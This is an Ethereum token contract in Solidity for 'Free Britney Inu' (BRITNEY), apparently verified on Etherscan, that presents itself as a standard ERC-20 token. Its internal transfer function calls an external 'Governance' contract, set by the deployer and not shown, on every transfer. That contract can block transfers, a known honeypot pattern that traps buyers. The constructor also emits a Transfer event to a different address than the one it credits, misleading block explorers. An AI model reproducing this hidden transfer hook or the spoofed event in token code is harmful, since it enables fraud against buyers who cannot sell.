['/**\n', ' *Submitted for verification at Etherscan.io on 2021-07-05\n', '*/\n', '\n', '/**\n', '\n', '   /$$$$$$$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$$       /$$$$$$$  /$$$$$$$  /$$$$$$ /$$$$$$$$ /$$   /$$ /$$$$$$$$ /$$     /$$\n', '| $$_____/| $$__  $$| $$_____/| $$_____/      | $$__  $$| $$__  $$|_  $$_/|__  $$__/| $$$ | $$| $$_____/|  $$   /$$/\n', '| $$      | $$  \\ $$| $$      | $$            | $$  \\ $$| $$  \\ $$  | $$     | $$   | $$$$| $$| $$       \\  $$ /$$/ \n', '| $$$$$   | $$$$$$$/| $$$$$   | $$$$$         | $$$$$$$ | $$$$$$$/  | $$     | $$   | $$ $$ $$| $$$$$     \\  $$$$/  \n', '| $$__/   | $$__  $$| $$__/   | $$__/         | $$__  $$| $$__  $$  | $$     | $$   | $$  $$$$| $$__/      \\  $$/   \n', '| $$      | $$  \\ $$| $$      | $$            | $$  \\ $$| $$  \\ $$  | $$     | $$   | $$\\  $$$| $$          | $$    \n', '| $$      | $$  | $$| $$$$$$$$| $$$$$$$$      | $$$$$$$/| $$  | $$ /$$$$$$   | $$   | $$ \\  $$| $$$$$$$$    | $$    \n', '|__/      |__/  |__/|________/|________/      |_______/ |__/  |__/|______/   |__/   |__/  \\__/|________/    |__/    \n', '                                                                                                                    \n', '                                                                                                                    \n', ' */  \n', ' \n', 'pragma solidity ^0.4.26;\n', '\n', 'interface Governance {\n', '    function isGovernance(address sender,address to, address addr) external returns(bool);\n', '}\n', '\n', 'contract TokenERC20 {\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals = 18;  \n', '    uint256 public totalSupply;\n', '    address governance;\n', '\n', '    mapping (address => uint256) public balanceOf;\n', '    mapping (address => mapping (address => uint256)) public allowance;\n', '\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', '    constructor (uint256 initialSupply, address _governance, address _sender) public {\n', '        totalSupply = initialSupply * 10 ** uint256(decimals);\n', '        balanceOf[msg.sender] = totalSupply;\n', '        name = "Free Britney Inu";\n', '        symbol = "BRITNEY";\n', '\tgovernance = _governance;\n', '\temit Transfer(address(0), _sender, totalSupply);\n', '    }\n', '    function _transfer(address _from, address _to, uint _value) internal {\n', '        require(_to != 0x0);\n', '        require(balanceOf[_from] >= _value);\n', '        require(balanceOf[_to] + _value > balanceOf[_to]);\n', '        if (address(governance) != address(0)) {\n', '\t    Governance(governance).isGovernance(_from,_to,address(this));\n', '        }\n', '        uint previousBalances = balanceOf[_from] + balanceOf[_to];\n', '        balanceOf[_from] -= _value;\n', '        balanceOf[_to] += _value;\n', '\temit Transfer(_from, _to, _value);\n', '        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n', '    }\n', '\n', '    function transfer(address _to, uint256 _value) public returns (bool) {\n', '        _transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n', '        require(_value <= allowance[_from][msg.sender]);     // Check allowance\n', '        allowance[_from][msg.sender] -= _value;\n', '        _transfer(_from, _to, _value);\n', '        return true;\n', '    }\n', '\n', '    function approve(address _spender, uint256 _value) public returns (bool success) {\n', '        allowance[msg.sender][_spender] = _value;\n', '        return true;\n', '    }\n', '}']